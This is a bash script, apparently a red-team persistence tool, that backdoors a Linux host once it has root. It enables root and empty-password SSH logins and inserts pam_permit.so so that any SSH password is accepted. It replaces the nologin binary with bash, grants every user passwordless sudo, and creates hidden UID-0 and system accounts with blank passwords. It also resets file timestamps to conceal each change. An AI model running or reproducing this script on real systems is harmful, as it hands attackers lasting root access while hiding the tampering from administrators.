#!/usr/bin/env bash

if [ $EUID -ne 0 ]; then
	echo "[!] Must run as root" exit 1
fi



# *** Helper Functions ***

# Colored text output
cecho () {
	ColorOff='\033[0m'
	BWhite='\033[1;37m'
	Red='\033[0;31m'
	Yellow='\033[0;33m'
	Cyan='\033[0;36m'
	Blue='\033[0;34m'
	Purple='\033[0;35m'
	Green='\033[0;32m'

	local CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"

	if [ $# -ne 2 ]; then
		echo -e "$CechoUsage"
		return 1
	fi

	local LogType=$1
	local LogMessage=$2

	case $LogType in
		"task")
			echo
			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
			;;
		"error")
			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
			;;
		"warning")
			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
			;;
		"info")
			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
			;;
		"log")
			echo -e "${Blue}[^] ${LogMessage}${ColorOff}"
			;;
		"debug")
			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
			;;
		"done")
			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
			;;
		*)
			echo -e "$CechoUsage"
			;;
	esac
}

# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
get_timestamp () {
	if [ $# -ne 1 ]; then
		cecho error "get_timestamp usage: get_timestamp <file>"
		return 1
	fi
	
	local file="$1"

	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
		cecho error "Couldn't stat '$file'"
		return 1
	fi
}

set_timestamp () {
	if [ $# -ne 2 ]; then
		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
		return 1
	fi

	local timestamp="$1"
	local file="$2"

	if ! touch -t "$timestamp" "$file"; then
		cecho error "Couldn't modify timestamp for '$file'"
		return 1
	else
		cecho info "Modified timestamp for '$file'"
	fi
}

create_sha512_password_hash () {
	# mkpasswd usually found on debian systems
	if which mkpasswd &>/dev/null; then
		echo `echo -n "$USER_PASSWORD" | mkpasswd -s -m "sha512crypt"`
	# Python crypt module only available in versions >= 3.3
	elif which python3 &>/dev/null && [ `python3 --version | cut -d " " -f 2 | cut -d "." -f 1-2 | tr -d "."` -ge 33 ]; then
		echo `python3 -c "import crypt; print(crypt.crypt('$USER_PASSWORD', crypt.mksalt(crypt.METHOD_SHA512)))"`
	# Assume python2, use less secure (pseudo random) salt generation
	elif which python &>/dev/null; then
		# Have to do the '$' concatenations because it was returning "None" when invoked as a subcommand (``),
		# even though when running normally it had correct output.
		echo `python2 -c "import random,string,crypt; print crypt.crypt('password1\!', '\$' + '6' + '\$' + ''.join(random.sample(string.ascii_letters,8)))"`
	else
	# Fallback to non-unique salt, would be much more noticeable in /etc/shadow
		echo "$USER_PASSWORD_HASH_FALLBACK"
	fi
}



# *** Configurable variables ***

SSH_CONFIG_DIR="/etc/ssh"
SSHD_CONFIG="$SSH_CONFIG_DIR/sshd_config"
SSHD_OPTIONS="PermitRootLogin PermitEmptyPasswords PasswordAuthentication PubkeyAuthentication UsePAM"
PAM_DIR="/etc/pam.d"
SSHD_PAM="$PAM_DIR/sshd"

PASSWD="/etc/passwd"
SHADOW="/etc/shadow"
BACKUP_NOLOGIN="/sbin/nologging"
EXTRA_BASH="/sbin/nothing"

SUDOERS_PATH="/etc/sudoers"
SUDOERS_CONTENT="ALL ALL=(ALL:ALL) NOPASSWD: ALL"

SUDOERS_DIR="/etc/sudoers.d"
SUDOERS_CONFIG_NAME="kali-grant-root"
SUDOERS_CONFIG_PATH="$SUDOERS_DIR/$SUDOERS_CONFIG_NAME"

NEW_GROUPS="users wheel sudo"
ADD_TO_GROUPS="users,sudo,kali-trusted"

SUID_BINS="bash dash zsh ksh tclsh python python2 python3 perl php lua vi vim nano less more tail nc nmap curl wget cat chmod chown cp mv nohup sed ss systemctl initctl service"

# Declaring "associative arrays" (dictionaries)
# ${var[@]} contains values, ${!var[@]} contains keys: note the addition of the "!" for keys
declare -A NEW_ROOT_USERS # dictionary, key-value pairs
NEW_ROOT_USERS["sbin"]="sbin" # key: username, value: passwd comment
NEW_ROOT_USERS["ucp"]="ucp"
declare -A NEW_SYSTEM_USERS
NEW_SYSTEM_USERS["systemd-time"]="systemd Hardware Timing,,,"
NEW_SYSTEM_USERS["mysqld"]="MySQL Server Daemon,,,"
declare -A NEW_NORMAL_USERS
NEW_NORMAL_USERS[$(hostname | cut -d "." -f 1)]="$(hostname | cut -d "." -f 1),,,"
DEFAULT_HOME="/sbin"
DEFAULT_SHELL="/usr/sbin/nologin"
USER_PASSWORD='Password123!'
USER_PASSWORD_HASH_FALLBACK='$6$WBBmpAfTATjQcsaX$Swrd6lone44mmh7PzfKpM6BXCKqC2huEdJo1jCfTUicPWfV8jkfPAC3ff3ZGIMa/B2zp/shGUDCRk0x0U20VH0' # echo -n 'Password123!' | mkpasswd -s -m "sha512crypt"



# *** Main ***


cecho task "Weakening SSH"

if [ ! -f "$SSHD_CONFIG" ]; then
	cecho warning "SSHD configuration file '$SSHD_CONFIG' does not exist, skipping"
else
	ssh_timestamp=`get_timestamp "$SSH_CONFIG_DIR"`
	sshd_timestamp=`get_timestamp "$SSHD_CONFIG"`

	if [ -z "$SSHD_OPTIONS" ]; then
		cecho warning "No SSHD options set, skipping"
	else
		for option in $SSHD_OPTIONS; do
			if egrep -q "^$option yes" "$SSHD_CONFIG"; then
				cecho log "Option '$option' already enabled"
			else
				sed -i "s/.*$option.*/$option yes/g" "$SSHD_CONFIG" && cecho info "Modified '$SSHD_CONFIG': option '$option' set to 'yes'" || cecho error "Couldn't modify '$SSHD_CONFIG' to set option '$option' to 'yes'"
			fi
		done
	fi

	set_timestamp $ssh_timestamp $SSH_CONFIG_DIR
	set_timestamp $sshd_timestamp $SSHD_CONFIG

	# Restart the sshd service
	if which systemctl &>/dev/null; then
		systemctl restart sshd
	elif which service &>/dev/null; then
		service ssh restart # "ssh" vs "sshd" for service vs systemctl
	else
		cecho error "Could not restart sshd service: 'systemctl' nor 'service' found on system"
	fi
	cecho info "Restarted the sshd service"
fi

if [ ! -f "$SSHD_PAM" ]; then
	cecho warning "SSHD PAM file '$SSHD_PAM' does not exist, skipping"
else
	if grep -q "pam_permit.so" "$SSHD_PAM"; then
		cecho log "SSH PAM authentication already bypassed"
	else
		pam_timestamp=`get_timestamp "$PAM_DIR"`
		sshd_pam_timestamp=`get_timestamp "$SSHD_PAM"`

		# Allow SSH authentication with any password. The below line is added to the top of the SSHD_PAM file.
		sed -i '1s/^/auth       sufficient     pam_permit.so\n/' $SSHD_PAM && cecho info "SSH PAM authentication bypassed" || cecho error "Couldn't modify '$SSHD_PAM'"
		set_timestamp $pam_timestamp $PAM_DIR
		set_timestamp $sshd_pam_timestamp $SSHD_PAM
	fi
fi

cecho done "Weakening SSH done"



cecho task "Weakening important system files"

nologin_path=`which nologin`
bash_path=`which bash`

sbin_timestamp=`get_timestamp "/sbin"`
bin_timestamp=`get_timestamp "/bin"`
nologin_timestamp=`get_timestamp "$nologin_path"`
bash_timestamp=`get_timestamp "$bash_path"`

cp "$bash_path" "$nologin_path" && cecho info "Turned '$nologin_path' into a bash binary" && set_timestamp $nologin_timestamp "$nologin_path" || cecho error "Couldn't replace '$nologin_path' with the bash binary"

set_timestamp $sbin_timestamp "/sbin"
set_timestamp $bin_timestamp "/bin"

cecho done "Done weaking important system files"



cecho task "Granting all users passwordless sudo"

if [ ! -f "$SUDOERS_PATH" ]; then
	cecho error "Sudoers file '$SUDOERS_PATH' does not exist, skipping"
else
	etc_timestamp=$(get_timestamp "/etc/")
	sudoers_timestamp=$(get_timestamp "$SUDOERS_PATH")

	# Note: /etc/sudoers can't be world writable or sudo doesn't work

	if egrep -q "$SUDOERS_CONTENT" "$SUDOERS_PATH"; then
		cecho log "All users already have passwordless sudo permissions, skipping"
	else
		echo "$SUDOERS_CONTENT" >> "$SUDOERS_PATH" && cecho info "Gave all users passwordless sudo permissions" || cecho error "Could not modify '$SUDOERS_PATH' to give all users passwordless sudo permissions"
	fi

	set_timestamp $etc_timestamp "/etc"
	set_timestamp $sudoers_timestamp "$SUDOERS_PATH"
fi

cecho done "Done granting all users passwordless sudo"



cecho task "Setting passwords for all default nologin users"

cecho debug "TO-DO!"

cecho done "Done setting passwords for all default nologin users"



cecho task "Creating new root users"

if [ "${#NEW_ROOT_USERS[@]}" -lt 1 ]; then
	cecho warning "No new root users to create, skipping"
else
	etc_timestamp=`get_timestamp "/etc"`
	passwd_timestamp=`get_timestamp "$PASSWD"`
	passwd_backup_timestamp=`get_timestamp "${PASSWD}-"`
	shadow_timestamp=`get_timestamp "$SHADOW"`
	shadow_backup_timestamp=`get_timestamp "${SHADOW}-"`
	subuid_timestamp=`get_timestamp "/etc/subuid"`
	subuid_backup_timestamp=`get_timestamp "/etc/subuid-"`
	subgid_timestamp=`get_timestamp "/etc/subgid"`
	subgid_backup_timestamp=`get_timestamp "/etc/subgid-"`
	group_timestamp=`get_timestamp "/etc/group"`
	group_backup_timestamp=`get_timestamp "/etc/group-"`
	gshadow_timestamp=`get_timestamp "/etc/gshadow"`
	gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`

	for username in "${!NEW_ROOT_USERS[@]}"; do
		if grep -q "${username}:x:" "$PASSWD"; then
			cecho warning "User '$username' already exists, skipping"
		else
			# no-log-init, non-unique, uid, gid, no-create-home, comment, home-dir, shell, username
			useradd -l -o -u 0 -g 0 -M -c "${NEW_ROOT_USERS[$username]}" -d "$DEFAULT_HOME" -s "$DEFAULT_SHELL" "$username" && cecho info "Created new root user '$username'" || cecho error "Could not create new root user '$username'"
			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
		fi
	done

	set_timestamp $etc_timestamp "/etc"
	set_timestamp $passwd_timestamp $PASSWD
	set_timestamp $passwd_backup_timestamp "${PASSWD}-"
	set_timestamp $shadow_timestamp $SHADOW
	set_timestamp $shadow_backup_timestamp "${SHADOW}-"
	set_timestamp $subuid_timestamp "/etc/subuid"
	set_timestamp $subuid_backup_timestamp "/etc/subuid-"
	set_timestamp $subgid_timestamp "/etc/subgid"
	set_timestamp $subgid_backup_timestamp "/etc/subgid-"
	set_timestamp $group_timestamp "/etc/group"
	set_timestamp $group_backup_timestamp "/etc/group-"
	set_timestamp $gshadow_timestamp "/etc/gshadow"
	set_timestamp $gshadow_backup_timestamp "/etc/gshadow-"
	
	cecho debug "If rearranging passwd or shadow, run this command when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD && touch -t $shadow_timestamp $SHADOW && touch -t $etc_timestamp /etc"
fi

cecho done "Done creating new root users"



cecho task "Creating new system users"

if [ "${#NEW_SYSTEM_USERS[@]}" -lt 1 ]; then
	cecho warning "No new system users to create, skipping"
else
	etc_timestamp=`get_timestamp "/etc"`
	passwd_timestamp=`get_timestamp "$PASSWD"`
	passwd_backup_timestamp=`get_timestamp "${PASSWD}-"`
	shadow_timestamp=`get_timestamp "$SHADOW"`
	shadow_backup_timestamp=`get_timestamp "${SHADOW}-"`
	subuid_timestamp=`get_timestamp "/etc/subuid"`
	subuid_backup_timestamp=`get_timestamp "/etc/subuid-"`
	subgid_timestamp=`get_timestamp "/etc/subgid"`
	subgid_backup_timestamp=`get_timestamp "/etc/subgid-"`
	group_timestamp=`get_timestamp "/etc/group"`
	group_backup_timestamp=`get_timestamp "/etc/group-"`
	gshadow_timestamp=`get_timestamp "/etc/gshadow"`
	gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`

	for username in "${!NEW_SYSTEM_USERS[@]}"; do
		if grep -q "${username}:x:" "$PASSWD"; then
			cecho warning "User '$username' already exists, skipping"
		else
			# no-log-init, system, no-create-home, comment, home-dir, shell, groups, username
			useradd -l -r -M -c "${NEW_SYSTEM_USERS[$username]}" -d "$DEFAULT_HOME" -s "$DEFAULT_SHELL" -G "$ADD_TO_GROUPS" "$username" && cecho info "Created new system user '$username'" || cecho error "Could not create new system user '$username'"
			sed -i "s/$username:[!*]*:/$username::/g" "$SHADOW" && cecho info "Made user '$username' have no password" || cecho error "Could not modify '$SHADOW' to make user '$username' passwordless"
		fi
	done

	set_timestamp $etc_timestamp "/etc"
	set_timestamp $passwd_timestamp $PASSWD
	set_timestamp $passwd_backup_timestamp "${PASSWD}-"
	set_timestamp $shadow_timestamp $SHADOW
	set_timestamp $shadow_backup_timestamp "${SHADOW}-"
	set_timestamp $subuid_timestamp "/etc/subuid"
	set_timestamp $subuid_backup_timestamp "/etc/subuid-"
	set_timestamp $subgid_timestamp "/etc/subgid"
	set_timestamp $subgid_backup_timestamp "/etc/subgid-"
	set_timestamp $group_timestamp "/etc/group"
	set_timestamp $group_backup_timestamp "/etc/group-"
	set_timestamp $gshadow_timestamp "/etc/gshadow"
	set_timestamp $gshadow_backup_timestamp "/etc/gshadow-"

	cecho debug "If rearranging passwd or shadow, run this command when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD && touch -t $shadow_timestamp $SHADOW && touch -t $etc_timestamp /etc"
fi

cecho done "Done creating new system users"



cecho task "Creating new normal users"

if [ "${#NEW_NORMAL_USERS[@]}" -lt 1 ]; then
        cecho warning "No new normal users to create, skipping"
else
        etc_timestamp=`get_timestamp "/etc"`
        passwd_timestamp=`get_timestamp "$PASSWD"`
        passwd_backup_timestamp=`get_timestamp "${PASSWD}-"`
        shadow_timestamp=`get_timestamp "$SHADOW"`
        shadow_backup_timestamp=`get_timestamp "${SHADOW}-"`
        subuid_timestamp=`get_timestamp "/etc/subuid"`
        subuid_backup_timestamp=`get_timestamp "/etc/subuid-"`
        subgid_timestamp=`get_timestamp "/etc/subgid"`
        subgid_backup_timestamp=`get_timestamp "/etc/subgid-"`
        home_timestamp=`get_timestamp "/home"`
        group_timestamp=`get_timestamp "/etc/group"`
        group_backup_timestamp=`get_timestamp "/etc/group-"`
        gshadow_timestamp=`get_timestamp "/etc/gshadow"`
        gshadow_backup_timestamp=`get_timestamp "/etc/gshadow-"`

        for username in "${!NEW_NORMAL_USERS[@]}"; do
                if grep -q "${username}:x:" "$PASSWD"; then
                        cecho warning "User '$username' already exists, skipping"
                else
                        # no-log-init, create-home, comment, shell, groups, username, password
                        useradd -l -m -c "${NEW_NORMAL_USERS[$username]}" -s "/bin/bash" -G "$ADD_TO_GROUPS" "$username" -p "`create_sha512_password_hash`" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"

                        set_timestamp $home_timestamp "/home/$username"
                fi
        done

        set_timestamp $etc_timestamp "/etc"
        set_timestamp $passwd_timestamp $PASSWD
        set_timestamp $passwd_backup_timestamp "${PASSWD}-"
        set_timestamp $shadow_timestamp $SHADOW
        set_timestamp $shadow_backup_timestamp "${SHADOW}-"
        set_timestamp $subuid_timestamp "/etc/subuid"
        set_timestamp $subuid_backup_timestamp "/etc/subuid-"
        set_timestamp $subgid_timestamp "/etc/subgid"
        set_timestamp $subgid_backup_timestamp "/etc/subgid-"
        set_timestamp $home_timestamp "/home"
        set_timestamp $group_timestamp "/etc/group"
        set_timestamp $group_backup_timestamp "/etc/group-"
        set_timestamp $gshadow_timestamp "/etc/gshadow"
        set_timestamp $gshadow_backup_timestamp "/etc/gshadow-"

	cecho debug "If rearranging passwd or shadow, run this command when done to modify the timestamps:
	touch -t $passwd_timestamp $PASSWD && touch -t $shadow_timestamp $SHADOW && touch -t $etc_timestamp /etc"
fi

cecho done "Done creating new normal users"



echo
cecho done "--- SYSTEM WEAKENING COMPLETE ---"
cecho debug "Don't forget to delete me!"
